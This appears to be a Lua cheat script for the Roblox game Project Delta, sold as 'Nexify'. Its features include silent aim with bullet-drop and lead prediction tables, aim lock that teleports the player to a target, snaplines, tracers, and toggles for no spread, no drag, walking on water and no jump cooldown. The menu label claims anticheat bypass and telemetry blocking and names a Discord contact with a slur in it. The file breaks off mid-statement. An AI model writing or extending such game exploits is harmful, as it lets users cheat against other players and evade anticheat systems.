wait(4)
library:Notify("[UAC] BAN DETECTOR STARTED!",2)


local materialMapping = {}
for _, material in ipairs(Enum.Material:GetEnumItems()) do
    materialMapping[material.Name] = material
end


aimtab:AddDropdown('dv2materialchanger', {
    Values = materials,
    Default = 1,
    Multi = false,
    Text = 'DV2 Material Changer',
    Tooltip = 'Changes The Material Of The DV2',
    Callback = function(selectedValue)
        
        local materialType = materialMapping[selectedValue]
        
        
        if materialType then
            
            local item = game.Workspace:FindFirstChild('Camera')
                                    :FindFirstChild('ViewModel')
                                    :FindFirstChild('Item')
                                    :FindFirstChild('ItemRoot')

            
            if item then
                
                item.Material = materialType
                item.SurfaceAppearance:Destroy()
            else
                warn('Item not found at the specified path.')
            end
        else
            warn('Selected material not recognized.')
        end
    end
})


















aimtab:AddSlider('fovslider', {
    Text = 'FOV Slider',
    Default = 90,
    Min = 0, 
    Max = 120,
    Rounding = 2,
    Compact = false,
}):OnChanged(function(State)
    
    if camera then
        
        camera.FieldOfView = State 

    else
        warn("Camera not found!")
    end
end)










local function isValidTarget(target)
    if target and target:IsA("BasePart") then
        local character = target.Parent
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        return humanoid and humanoid.Health > 0
    end
    return false
end





        
 
            virtualInput:SendMouseButtonEvent(0, 0, 0, true, game, 0) 
 
            virtualInput:SendMouseButtonEvent(0, 0, 0, false, game, 0) 
 
        
 
  
    
    






    


        


 






 
























aimtab:AddToggle('predictiontoggle13', {
    Text = 'Prediction Toggle',
    Tooltip = 'Prediction',
    Default = false,

    Callback = function(first)
                print("Prediction enabled:", predictionEnabled)
                togglePrediction()
    end
})





 
 
 
 
  
 

 



local isEnabled883 = false  
local LC = game.Players.LocalPlayer

local function toggleBunnyHop()
    isEnabled883 = not isEnabled883
    print("Bunny Hop is now", isEnabled883 and "enabled" or "disabled")
end

game:GetService("RunService").RenderStepped:Connect(function()
    if isEnabled883 then
        LC.Character.Humanoid:SetAttribute("JumpCooldown", 0)
    end
end)

aimtab:AddToggle('Bunnyhop', {
    Text = 'No Jump Cooldown',
    Tooltip = 'Bunny Hop',
    Risky = true,
    Default = false,

    Callback = function(first)
        toggleBunnyHop()
    end
})



local function updateSoundIds()
    
    local hitMarkers = game.ReplicatedStorage:WaitForChild("SFX"):WaitForChild("Hits"):WaitForChild("HitMarkers")
    local hitMarkers2 = game.ReplicatedStorage:WaitForChild("SFX"):WaitForChild("Hits"):WaitForChild("ProjectileHits")
    
    
    local sounds = {
        Helmet = hitMarkers:FindFirstChild("Helmet"),
        BodyArmor = hitMarkers:FindFirstChild("BodyArmor"),
        Hit2 = hitMarkers2:FindFirstChild("Hit"),
        Bodyshot = hitMarkers:FindFirstChild("Bodyshot"),
        Headshot = hitMarkers:FindFirstChild("Headshot")
    }

    
    for name, sound in pairs(sounds) do
        if sound then
            sound.SoundId = "rbxassetid://5043539486"
            print(name .. " SoundId updated to: " .. sound.SoundId)
        else
            warn(name .. " sound not found")
        end
    end
end






local isCheckingVisibility = false
local textLabel = nil
local connection = nil


local function createVisibilityText()
    if not textLabel then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

        textLabel = Instance.new("TextLabel")
        textLabel.Parent = screenGui
        textLabel.Text = ""
        textLabel.TextColor3 = Color3.new(0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Position = UDim2.new(0.5, 0, 0.9, 0) 
        textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.TextSize = 24 
    end
end


local function isPlayerVisible(target)
    if target and target.Parent:FindFirstChild("HumanoidRootPart") then
        local camera = workspace.CurrentCamera
        local humanoidRootPart = target.Parent.HumanoidRootPart
        local ray = Ray.new(camera.CFrame.Position, (humanoidRootPart.Position - camera.CFrame.Position).unit * 5000)
        local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {camera, game.Players.LocalPlayer.Character})

        if part and part:IsDescendantOf(target.Parent) then
            return true
        end
    end
    return false
end


local function toggleVisibilityCheck()
    isCheckingVisibility = not isCheckingVisibility

    if isCheckingVisibility then
        createVisibilityText()

        connection = game:GetService("RunService").RenderStepped:Connect(function()
            local target = game.Players.LocalPlayer:GetMouse().Target
            if isPlayerVisible(target) then
                textLabel.Text = "Player Visible"
            else
                textLabel.Text = ""
            end
        end)
    else
        if connection then
            connection:Disconnect()
            connection = nil
        end
        if textLabel then
            textLabel.Text = ""
        end
    end
end






  
  
 

  
        
 















aimtab:AddToggle('walkunderwater', {
    Text = 'Walk Under Water',
    Tooltip = 'Walk Under The Water',
    Default = false,

    Callback = function(first)
        toggleSwimmingState()
    end
})




local UserInputService3es = game:GetService("UserInputService")

local Players3es = game:GetService("Players")
local RunService3es = game:GetService("RunService")
local Workspace3es = game:GetService("Workspace")

local player3es = Players3es.LocalPlayer
local mouse3es = player3es:GetMouse()
local keybind3es = Enum.KeyCode.G  
local aimLockEnabled3es = false  
local aimLock3es = false  
local lockedPlayer3es = nil

local function findClosestPlayerToCursor3es()
    local closestPlayer3es = nil
    local shortestDistance3es = math.huge
    for _, otherPlayer3es in pairs(Players3es:GetPlayers()) do
        if otherPlayer3es ~= player3es and otherPlayer3es.Character and otherPlayer3es.Character:FindFirstChild("HumanoidRootPart") then
            local screenPosition3es, onScreen3es = Workspace3es.CurrentCamera:WorldToScreenPoint(otherPlayer3es.Character.HumanoidRootPart.Position)
            if onScreen3es then
                local distanceFromMouse3es = (Vector2.new(screenPosition3es.X, screenPosition3es.Y) - Vector2.new(mouse3es.X, mouse3es.Y)).magnitude
                if distanceFromMouse3es < shortestDistance3es then
                    shortestDistance3es = distanceFromMouse3es
                    closestPlayer3es = otherPlayer3es
                end
            end
        end
    end
    return closestPlayer3es
end

local function teleportAndLockToHead3es()
    local closestPlayer3es = findClosestPlayerToCursor3es()
    if closestPlayer3es and player3es.Character and player3es.Character:FindFirstChild("HumanoidRootPart") then
        local head3es = closestPlayer3es.Character:FindFirstChild("Head")
        if head3es then
            local targetPosition3es = closestPlayer3es.Character.HumanoidRootPart.Position - (closestPlayer3es.Character.HumanoidRootPart.CFrame.LookVector * 5)
            local targetOrientation3es = closestPlayer3es.Character.HumanoidRootPart.CFrame.LookVector

            player3es.Character.HumanoidRootPart.Anchored = true
            RunService3es.Stepped:Wait()

            player3es.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition3es, targetPosition3es + targetOrientation3es)
            RunService3es.Stepped:Wait()
            player3es.Character.HumanoidRootPart.Anchored = false

            Workspace3es.CurrentCamera.CFrame = CFrame.new(Workspace3es.CurrentCamera.CFrame.Position, head3es.Position)
            aimLock3es = true
            lockedPlayer3es = closestPlayer3es

            RunService3es.RenderStepped:Connect(function()
                if aimLock3es and lockedPlayer3es and Players3es:FindFirstChild(lockedPlayer3es.Name) then
                    local head3es = lockedPlayer3es.Character:FindFirstChild("Head")
                    if head3es then
                        Workspace3es.CurrentCamera.CFrame = CFrame.new(Workspace3es.CurrentCamera.CFrame.Position, head3es.Position)
                    end
                end
            end)
        end
    end
end

UserInputService3es.InputBegan:Connect(function(input3es, isProcessed3es)
    if not isProcessed3es and input3es.KeyCode == keybind3es then
        if aimLockEnabled3es then
            aimLock3es = false
            lockedPlayer3es = nil
            aimLockEnabled3es = false
        else
            teleportAndLockToHead3es()
            aimLockEnabled3es = true
        end
    end
end)

UserInputService3es.InputEnded:Connect(function(input3es, isProcessed3es)
    if not isProcessed3es and input3es.KeyCode == keybind3es then
        aimLock3es = false
        lockedPlayer3es = nil
    end
end)

player3es.CameraMode = Enum.CameraMode.LockFirstPerson

MenuGroup:AddLabel("Nexify\n#1 Project Delta Script\nLast Updated: 9.12.2024\nVersion: V2.3 (Build 2312)\nUID: Buyer\n\nLibrary Version: Linoria Modded By Nexify V1.2\nRuntime Environment: Lua VM 5.1 (Optimized)\nEncryption: AES-256 + Luraph Obfuscation\nDetection Status: Undetected\nScript Ready!\nGame ID: 7336302630\n\n--- Performance Metrics ---\nCompatibility: Direct Game\nChecksum: 6F2D3B9A1C\nBootstrapping Time: <2.55ms\nExecutor: Solara V3\nExecution Time (Avg): <0.5ms\n--- Security Details ---\nAnticheat Bypass: Failed\nDebugging Protections: Enabled\nExploit Protections: High\nTelemetry Blocking: Active\n\n--- User Environment ---\nExecutor Version: Solara V3.12\nCustom Themes: Supported\n\n--- Additional Info ---\nSupport Contact: .crazyniga (Discord)\nLicense Type: Buyer / Standart", true)




 
 

 

            
 

 
            
 
 




local Utility = {
    Drawings = { };
    Objects = { };
    BindToRenders = { };
    Fonts = { }
}



local tracersEnabled = false 





local isFiring = false



function Utility:ToggleTracers(enable)
    tracersEnabled = enable
end


function Utility:HasViewModel()
    return workspace:FindFirstChild("Camera") and workspace.Camera:FindFirstChild("ViewModel") ~= nil
end


function Utility:CreateBullets(Position, From)
    if not tracersEnabled or not self:HasViewModel() then
        return 
    end

    local direction = (Position - From).unit 

    local BulletTracers = Instance.new("Part")
    BulletTracers.Anchored = true
    BulletTracers.CanCollide = false
    BulletTracers.Material = Enum.Material.ForceField
    BulletTracers.Color = Color3.fromRGB(119, 120, 255)
    BulletTracers.Size = Vector3.new(0.1, 0.1, (From - Position).magnitude)
    BulletTracers.CFrame = CFrame.new(From, Position) * CFrame.new(0, 0, -BulletTracers.Size.Z / 2)
    BulletTracers.Name = "BulletTracers"
    BulletTracers.Transparency = 0
    BulletTracers.Parent = game.Workspace.NoCollision

    
    local function addDecal(face)
        local decal = Instance.new("Decal")
        decal.Texture = "rbxassetid://7151778311"
        decal.Face = face
        decal.Transparency = 0
        decal.Parent = BulletTracers
    end

    
    addDecal(Enum.NormalId.Front)
    addDecal(Enum.NormalId.Back)
    addDecal(Enum.NormalId.Top)
    addDecal(Enum.NormalId.Bottom)
    addDecal(Enum.NormalId.Left)
    addDecal(Enum.NormalId.Right)

    
    for i = 0, 1, 0.05 do
        BulletTracers.Transparency = i
        for _, decal in ipairs(BulletTracers:GetChildren()) do
            if decal:IsA("Decal") then
                decal.Transparency = i
            end
        end
        wait(0.1) 
    end
    
    BulletTracers:Destroy()
end


function FireWeapon()
    local gunPosition = game.Players.LocalPlayer.Character.Head.Position 
    local mouse = game.Players.LocalPlayer:GetMouse()
    local hitPosition = mouse.Hit.p 

    
    Utility:CreateBullets(hitPosition, gunPosition)
end




UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isFiring = true

        
        spawn(function()
            while isFiring do
                FireWeapon()
                wait(0.1) 
            end
        end)
    end
end)


UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isFiring = false
    end
end)


aimtab:AddToggle('tracers', {
    Text = 'Tracers',
    Tooltip = 'Toggle tracers on or off',
    Default = tracersEnabled, 
    Callback = function(enabled)
        Utility:ToggleTracers(enabled) 
    end
})

aimtab:AddButton('No Drag', function()


local function setAmmoDrag(first)
    local ammoTypes = game.ReplicatedStorage:FindFirstChild("AmmoTypes")
    if not ammoTypes then
        warn("AmmoTypes not found in ReplicatedStorage")
        return
    end

    for _, ammoType in pairs(ammoTypes:GetChildren()) do
        local dragValue = first and "0" or "DefaultDrag"
        ammoType:SetAttribute("Drag", 0)
    end
end


setAmmoDrag(true) 


 end)

 aimtab:AddButton('No Drop', function()

local ammo = game.ReplicatedStorage:FindFirstChild("AmmoTypes")
        if ammo then
            for _, v in pairs(ammo:GetChildren()) do
                v:SetAttribute("ProjectileDrop", 2)
            end
        else
            warn("AmmoTypes not found in ReplicatedStorage")
        end



 end)

aimtab:AddButton('No Spread', function()

local ammo = game.ReplicatedStorage:FindFirstChild("AmmoTypes")
        if ammo then
            for _, v in pairs(ammo:GetChildren()) do
                v:SetAttribute("AccuracyDeviation", 0)
            end
        else
            warn("AmmoTypes not found in ReplicatedStorage")
        end



 end)

local jesusEnabled = false
local jesusFolder = workspace:FindFirstChild("JesusFolder") or Instance.new("Folder", workspace)
jesusFolder.Name = "JesusFolder"

local function onJesusToggle(enabled)
    jesusEnabled = enabled

    
    if not jesusEnabled then
        for _, v in pairs(jesusFolder:GetChildren()) do
            v:Destroy()
        end
        return
    end

    
    while jesusEnabled do
        task.wait(0.1)

        local player = game.Players.LocalPlayer
        local character = player.Character

        if not character then
            continue
        end

        local head = character:FindFirstChild("Head")
        if not head then continue end

        local rayOrigin = head.Position + Vector3.new(0, 150, 0) + workspace.CurrentCamera.CFrame.LookVector * 5
        local rayDirection = Vector3.new(0, -300, 0)
        local rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        rayParams.FilterDescendantsInstances = {character}

        local rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

        if rayResult and rayResult.Material == Enum.Material.Water then
            local platform = Instance.new("Part")
            platform.Size = Vector3.new(500, 1, 500)
            platform.Anchored = true
            platform.CanCollide = true
            platform.Position = rayResult.Position + Vector3.new(0, 0.3, 0) 
            platform.Material = Enum.Material.ForceField
            platform.Parent = jesusFolder
        end
    end
end

aimtab:AddToggle('jesus', {
    Text = 'Walk On Water',
    Risky = true,
    Tooltip = 'Lets You Walk On Water',
    Default = false,

    Callback = function(value)
        onJesusToggle(value)
    end
})










 

 
 
 
  
    
 


local timeValue = 12 


local function changeTimeOfDay(value)
    Lighting.ClockTime = value
end


Misc:AddSlider('timeSlider', {
    Text = 'Set Time of Day',
    Default = 12, 
    Min = 0, 
    Max = 24, 
    Rounding = 1, 
    Compact = false,
}):OnChanged(function(value)
    
    timeValue = value 
    changeTimeOfDay(timeValue) 
end)


game:GetService("RunService").Stepped:Connect(function()
    if Lighting.ClockTime ~= timeValue then
        changeTimeOfDay(timeValue) 
    end
end)

movetab:AddButton('Remove Scope From Gun', function()


game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("Item"):FindFirstChild("Attachments"):FindFirstChild("Sight"):Destroy()

 end)



movetab:AddButton('Disable OKP7 SCOPE GUI', function()


game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("Item"):FindFirstChild("Attachments"):FindFirstChild("Sight"):FindFirstChild("OKP7"):FindFirstChild("Reticle"):FindFirstChild("ScopeGui"):Destroy()

 end)

Misc:AddButton('Remove Gloves From Viewmodel', function()


game.workspace:FindFirstChild("Camera"):FindFirstChild("ViewModel"):FindFirstChild("CombatGloves"):Destroy()	

 end)

aimtab:AddToggle('VisibleText', {
    Text = 'Visible Text',
    Tooltip = 'Tells you if the user you aim is visible or not',
    Default = false,

    Callback = function(first)
        toggleVisibilityCheck()
    end
})



Misc:AddButton('Remove Mag From Viewmodel', function()



if camera then
    local viewModel = camera:FindFirstChild("ViewModel")
    if viewModel then
        local item = viewModel:FindFirstChild("Item")
        if item then
            local attachments = item:FindFirstChild("Attachments")
            if attachments then
                local magazine = attachments:FindFirstChild("Magazine")
                if magazine then
                    magazine:Destroy()
                else
                    warn("Magazine not found in Attachments")
                end
            else
                warn("Attachments not found in Item")
            end
        else
            warn("Item not found in ViewModel")
        end
    else
        warn("ViewModel not found in Camera")
    end
else
    warn("Camera not found in Workspace")
end


 end)
print('number_' .. tostring(counter))
counter = counter + 1
local charactertab = pdeltatabbox1:AddTab("misc")
 
library:Notify(executorname33,2)
library:Notify("Loaded Script",1)

local function IsTargetVisible(target)
    if not plr.Character then return false end
    if not target then return false end
    if not camera:FindFirstChildOfClass("Model") then return false end
    if not camera:FindFirstChildOfClass("Model"):FindFirstChild("AimPart") then return false end
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = { plr.Character, camera, workspace.NoCollision }
    params.IgnoreWater = true
    params.CollisionGroup = "WeaponRay"
    local from = workspace.Camera.ViewModel:FindFirstChild("AimPart")
    local part, _ = workspace:Raycast(from.CFrame.p, (target.Position - from.CFrame.p).Unit * 6000, params)
    if part.Instance and part.Instance:IsDescendantOf(target.Parent) then
        local humanoid = target.Parent:FindFirstChildOfClass("Humanoid")
        if humanoid and humanoid.Parent == target.Parent then
            return true
        end
    end
    return false
end












local fovRadius = 175  
local fovCircle
fovradiussnapline=fovRadius

local bulletSpeed2 = 430           


local predictionForRanges = {
    [10] = 0.1,   [20] = 0.19,  [30] = 0.21,  [40] = 0.23,  [50] = 0.25,
    [60] = 0.27,   [70] = 0.29,  [80] = 0.31,  [90] = 0.33,  [100] = 0.35,
    [110] = 0.37,  [120] = 0.39, [130] = 0.41, [140] = 0.43, [150] = 0.45,
    [160] = 0.47,  [170] = 0.49, [180] = 0.51, [190] = 0.53, [200] = 0.55,
    [210] = 0.57,  [220] = 0.59, [230] = 0.61, [240] = 0.63, [250] = 0.65,
    [260] = 0.67,  [270] = 0.69, [280] = 0.71, [290] = 0.73, [300] = 0.75,
    [310] = 0.77,  [320] = 0.79, [330] = 0.81, [340] = 0.83, [350] = 0.85,
    [360] = 0.87,  [370] = 0.89, [380] = 0.91, [390] = 0.93, [400] = 0.95,
    [410] = 0.97,  [420] = 0.99, [430] = 1.01, [440] = 1.03, [450] = 1.05,
    [460] = 1.07,  [470] = 1.09, [480] = 1.11, [490] = 1.13, [500] = 1.15,
    [510] = 1.17,  [520] = 1.19, [530] = 1.21, [540] = 1.23, [550] = 1.25,
    [560] = 1.27,  [570] = 1.29, [580] = 1.31, [590] = 1.33, [600] = 1.35
}





local bulletDropForRanges = {
    [10] = 0.001, [20] = 0.002, [30] = 0.003, [40] = 0.004, [50] = 0.005,
    [60] = 0.006, [70] = 0.007, [80] = 0.008, [90] = 0.009, [100] = 0.010,
    [110] = 0.011, [120] = 0.012, [130] = 0.013, [140] = 0.014, [150] = 0.015,
    [160] = 0.016, [170] = 0.017, [180] = 0.018, [190] = 0.019, [200] = 0.020,
    [210] = 0.021, [220] = 0.022, [230] = 0.023, [240] = 0.024, [250] = 0.025,
    [260] = 0.026, [270] = 0.027, [280] = 0.028, [290] = 0.029, [300] = 0.030,
    [310] = 0.031, [320] = 0.032, [330] = 0.033, [340] = 0.034, [350] = 0.035,
    [360] = 0.036, [370] = 0.037, [380] = 0.038, [390] = 0.039, [400] = 0.040,
    [410] = 0.045, [420] = 0.046, [430] = 0.047, [440] = 0.049, [450] = 0.050,
    [460] = 0.052, [470] = 0.053, [480] = 0.054, [490] = 0.049, [500] = 0.050,
    [510] = 0.051, [520] = 0.052, [530] = 0.053, [540] = 0.054, [550] = 0.055,
    [560] = 0.056, [570] = 0.057, [580] = 0.058, [590] = 0.059, [600] = 0.060
}

 TweenService = game:GetService("TweenService")
local fovCircle 


 rgbfov = false 


function createFovCircle(fovRadius, colorStart, colorEnd, duration)
    
    if type(fovRadius) ~= "number" then
        warn("Invalid fovRadius: " .. tostring(fovRadius))  
        return  
    end
    
    
    if fovCircle then
        fovCircle:Remove()
    end

    
    fovCircle = Drawing.new("Circle")
    fovCircle.Thickness = 2         
    fovCircle.NumSides = 100        
    fovCircle.Radius = fovRadius   
    fovCircle.Color = colorStart   
    fovCircle.Filled = false       
    fovCircle.Visible = true       
    fovCircle.Transparency = 1     

    
    if rgbfov then
        
        local startTime = tick()

        
        game:GetService("RunService").Heartbeat:Connect(function()
            local elapsed = tick() - startTime  
            if elapsed >= duration then
                startTime = tick()  
            end

            
            local alpha = math.sin(elapsed * math.pi / duration) * 0.5 + 0.5  

            
            fovCircle.Color = colorStart:Lerp(colorEnd, alpha)
        end)
    else
        
        fovCircle.Color = Color3.fromRGB(255, 255, 255)  
    end
end



createFovCircle(fovRadius, Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255), 5)




local function updateFovCircle994()
    if fovCircle then
        
        local screenCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
        
        
        fovCircle.Position = screenCenter
        fovCircle.Radius = fovRadius 
    else
        createFovCircle()
    end
end

 Players = game:GetService("Players")
 LocalPlayer = Players.LocalPlayer
Mouse = LocalPlayer:GetMouse()
 Camera = game.Workspace.CurrentCamera
 GuiService = game:GetService("GuiService")


Snapline = Drawing.new("Line")
Snapline.Visible = false
Snapline.Thickness = 1
Snapline.Color = Color3.fromRGB(255, 255, 255) 


config = {
    snapline_enabled = true, 
    snapline_color = Color3.fromRGB(255, 255, 255), 
    fovRadius = fovradiussnapline, 
}


function findTargetWithinFovCircle()
    local mousePos = Vector2.new(Mouse.X, Mouse.Y)
    local closestTarget = nil
    local shortestDistance = config.fovRadius

    
    for _, targetPlayer in pairs(Players:GetPlayers()) do
        if targetPlayer ~= Players.LocalPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
            local head = targetPlayer.Character.Head
            local screenPos, onScreen = Camera:WorldToScreenPoint(head.Position)

            if onScreen then
                local screenPoint = Vector2.new(screenPos.X, screenPos.Y)
                local distance = (screenPoint - mousePos).Magnitude

                
                if distance < shortestDistance then
                    shortestDistance = distance
                    closestTarget = targetPlayer.Character
                end
            end
        end
    end

    return closestTarget
end

game:GetService("RunService").RenderStepped:Connect(function()
    if config.snapline_enabled then
        local targetCharacter = findTargetWithinFovCircle()

        if targetCharacter then
            local targetPos, onScreen = Camera:WorldToViewportPoint(targetCharacter.PrimaryPart.Position)

            local mousePos = Vector2.new(
                Mouse.X,
                Mouse.Y + GuiService:GetGuiInset().Y
            )

            
            Snapline.From = mousePos
            Snapline.To = Vector2.new(targetPos.X, targetPos.Y)
            Snapline.Visible = onScreen 
        else
            Snapline.Visible = false 
        end
    else
        Snapline.Visible = false
    end
end)

local function getPredictionForDistance(distance)
    local closestRange = 10  

    for range, _ in pairs(predictionForRanges) do
        if distance >= range then
            closestRange = range  
        end
    end

    return predictionForRanges[closestRange] or 0  
end


local function getBulletDropForDistance(distance)
    local closestRange = 10  

    for range, _ in pairs(bulletDropForRanges) do
        if distance >= range then
            closestRange = range  
        end
    end

    return bulletDropForRanges[closestRange] or 0  
end


local function adjustAimForBulletDrop(target, distance)
    local head = target:FindFirstChild("Head")
    if head then
        
        local compensation = getBulletDropForDistance(distance)
        
        
        local adjustedPosition = head.Position + Vector3.new(0, compensation, 0)
        
        return adjustedPosition
    end
    return target.Head.Position
end


local function predictTargetPosition(target)
    local head = target:FindFirstChild("Head")
    if head then
        local velocity = head.Velocity
        local distance = (Players.LocalPlayer.Character.Head.Position - head.Position).Magnitude
        
        
        local bulletTravelTime = distance / bulletSpeed2

        
        local predictedPosition = head.Position + (velocity * bulletTravelTime)

        
        local leadFactor = (bulletTravelTime * velocity).Magnitude
        predictedPosition = predictedPosition + (velocity.Unit * leadFactor)  
        
        
        predictedPosition = adjustAimForBulletDrop(target, distance)
        
        return predictedPosition
    end
    return head.Position
end


local isSilentAimEnabled994 = false 
local lockedCharacter = nil


local function updateAiming()
    if isSilentAimEnabled994 then 
        
        local characterUnderMouse = findTargetWithinFovCircle()

        
        if characterUnderMouse and characterUnderMouse ~= lockedCharacter then
            lockedCharacter = characterUnderMouse
        end

        
        if lockedCharacter and lockedCharacter:FindFirstChild("Head") and camera:FindFirstChild("ViewModel") then
            local head = lockedCharacter.Head
            local vm = camera:FindFirstChild("ViewModel")
            local ap = vm:FindFirstChild("AimPart")
            local apc = vm:FindFirstChild("AimPartCanted")
            local fc = vm:FindFirstChild("FakeCamera")

            if ap and apc and fc then
                
                local distance = (Players.LocalPlayer.Character.Head.Position - head.Position).Magnitude
                
                
                local aimPosition = predictTargetPosition(lockedCharacter)
                local cameraPosition = camera.CFrame.Position

                
                ap.CFrame = CFrame.new(cameraPosition, aimPosition)
                apc.CFrame = CFrame.new(cameraPosition, aimPosition)
            end
        end

        
        if not characterUnderMouse then
            lockedCharacter = nil
        end
    end
end


RunService.RenderStepped:Connect(function()
    updateFovCircle994()  
    updateAiming()
end)


createFovCircle()


Players.LocalPlayer.CharacterRemoving:Connect(function(character)
    lockedCharacter = nil  
end)





ViewModelSettings = {
    Color = Color3.new(0.768627, 0.039216, 0.913725), 
    Material = Enum.Material.Plastic, 
    IsEnabled = false, 
    HighlightEnabled = false, 
    HighlightTransparency = 0.5, 
    ArmCustomizationEnabled = false 
}


function applySettings(viewModel)
    if viewModel and ViewModelSettings.IsEnabled then
        
        for _, part in ipairs(viewModel:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Color = ViewModelSettings.Color 
                part.Material = ViewModelSettings.Material 

                
                local highlight = part:FindFirstChildOfClass("Highlight")
                if ViewModelSettings.HighlightEnabled then
                    if not highlight then
                        highlight = Instance.new("Highlight")
                        highlight.Parent = part
                    end
                    highlight.FillColor = ViewModelSettings.Color 
                    highlight.OutlineColor = Color3.new(1, 1, 1) 
                    highlight.OutlineTransparency = ViewModelSettings.HighlightTransparency 
                elseif highlight then
                    highlight:Destroy() 
                end
            end
            
            
            if part:IsA("MeshPart") then
                local surfaceAppearance = part:FindFirstChildOfClass("SurfaceAppearance")
                if surfaceAppearance then
                    surfaceAppearance:Destroy() 
                end
            end
        end
    end
end


function customizeArms(viewModel)
    if not viewModel then return end
    
    
    local wastelandShirt = viewModel:FindFirstChild("WastelandShirt")
    if wastelandShirt then
        wastelandShirt:Destroy()
    end
    
    
    local armParts = { "LeftLowerArm", "LeftUpperArm", "RightLowerArm", "RightUpperArm" }
    
    
    for _, armName in ipairs(armParts) do
        local armPart = viewModel:FindFirstChild(armName)
        if armPart and armPart:IsA("BasePart") then
            armPart.Material = Enum.Material.ForceField 
            armPart.Transparency = 0.8 

            
            local highlight = armPart:FindFirstChildOfClass("Highlight")
            if not highlight then
                highlight = Instance.new("Highlight")
                highlight.Parent = armPart
            end
            highlight.FillColor = ViewModelSettings.Color 
            highlight.OutlineColor = Color3.new(1, 1, 1) 
            highlight.OutlineTransparency = 0.5 
        end
    end
end


charactertab:AddLabel('-------------------------------------------------------------')



SkyBoxes = {
    ["Standard"] = {
        ["SkyboxBk"] = "rbxassetid://123456789", 
        ["SkyboxDn"] = "rbxassetid://123456789",
        ["SkyboxFt"] = "rbxassetid://123456789",
        ["SkyboxLf"] = "rbxassetid://123456789",
        ["SkyboxRt"] = "rbxassetid://123456789",
        ["SkyboxUp"] = "rbxassetid://123456789"
    },
    ["Among Us"] = {
        ["SkyboxBk"] = "rbxassetid://5752463190",
        ["SkyboxDn"] = "rbxassetid://5752463190",
        ["SkyboxFt"] = "rbxassetid://5752463190",
        ["SkyboxLf"] = "rbxassetid://5752463190",
        ["SkyboxRt"] = "rbxassetid://5752463190",
        ["SkyboxUp"] = "rbxassetid://5752463190"
    },
    ["Doge"] = {
        ["SkyboxBk"] = "rbxassetid://159713165",
        ["SkyboxDn"] = "rbxassetid://159713165",
        ["SkyboxFt"] = "rbxassetid://5752463190",
        ["SkyboxLf"] = "rbxassetid://5752463190",
        ["SkyboxRt"] = "rbxassetid://159713165",
        ["SkyboxUp"] = "rbxassetid://159713165"
    },
    ["Spongebob"] = {
        ["SkyboxBk"] = "rbxassetid://277099484",
        ["SkyboxDn"] = "rbxassetid://277099500",
        ["SkyboxFt"] = "rbxassetid://277099554",
        ["SkyboxLf"] = "rbxassetid://277099531",
        ["SkyboxRt"] = "rbxassetid://277099589",
        ["SkyboxUp"] = "rbxassetid://277101591"
    },
["Blood"] = {
    ["SkyboxBk"] = "rbxassetid://163288979",  
    ["SkyboxDn"] = "rbxassetid://163288979",  
    ["SkyboxFt"] = "rbxassetid://163288979",  
    ["SkyboxLf"] = "rbxassetid://163288979",  
    ["SkyboxRt"] = "rbxassetid://163288979",  
    ["SkyboxUp"] = "rbxassetid://163288979"   
},

    ["Deep Space"] = {
        ["SkyboxBk"] = "rbxassetid://159248188",
        ["SkyboxDn"] = "rbxassetid://159248183",
        ["SkyboxFt"] = "rbxassetid://159248187",
        ["SkyboxLf"] = "rbxassetid://159248173",
        ["SkyboxRt"] = "rbxassetid://159248192",
        ["SkyboxUp"] = "rbxassetid://159248176"
    },
    ["Winter"] = {
        ["SkyboxBk"] = "rbxassetid://510645155",
        ["SkyboxDn"] = "rbxassetid://510645130",
        ["SkyboxFt"] = "rbxassetid://510645179",
        ["SkyboxLf"] = "rbxassetid://510645117",
        ["SkyboxRt"] = "rbxassetid://510645146",
        ["SkyboxUp"] = "rbxassetid://510645195"
    },
    ["Clouded Sky"] = {
        ["SkyboxBk"] = "rbxassetid://252760981",
        ["SkyboxDn"] = "rbxassetid://252763035",
        ["SkyboxFt"] = "rbxassetid://252761439",
        ["SkyboxLf"] = "rbxassetid://252760980",
        ["SkyboxRt"] = "rbxassetid://252760986",
        ["SkyboxUp"] = "rbxassetid://252762652"
    },
}


charactertab:AddDropdown('skyboxDropdown', {
    Values = {"Standard", "Blood", "Among Us", "Doge", "Spongebob", "Deep Space", "Winter", "Clouded Sky"},  
    Default = 1,  
    Multi = false,
    Text = 'Skybox Selector',
    Tooltip = 'Select a skybox from the dropdown',
    Callback = function(selectedSkybox)
        local sky = game.Lighting:FindFirstChildOfClass("Sky")
        
        
        if not sky then
            sky = Instance.new("Sky")
            sky.Parent = game.Lighting
        end

        
        local selectedBox = SkyBoxes[selectedSkybox]
        if selectedBox then
            for key, assetId in pairs(selectedBox) do
                sky[key] = assetId 
            end
        else
            warn("Selected skybox is not available!")
        end
    end
})



terrain = game:GetService("Workspace").Terrain
originalGrassColor = terrain:GetMaterialColor(Enum.Material.Grass)


charactertab:AddLabel('Grass Color Picker'):AddColorPicker('ColorPickerGrass', {
    Default = originalGrassColor, 
    Title = 'Grass Color Picker',
    Transparency = 0,

    Callback = function(Value)
        
        local grassColor = Value

        
        terrain:SetMaterialColor(Enum.Material.Grass, grassColor)

        
        sethiddenproperty(terrain, "Decoration", true) 
    end
})




lastSelectedColor = Color3.fromRGB(0, 255, 255) 
colorPickerEnabled = false 
storedItems = {} 


charactertab:AddToggle('Character Color Picker', {
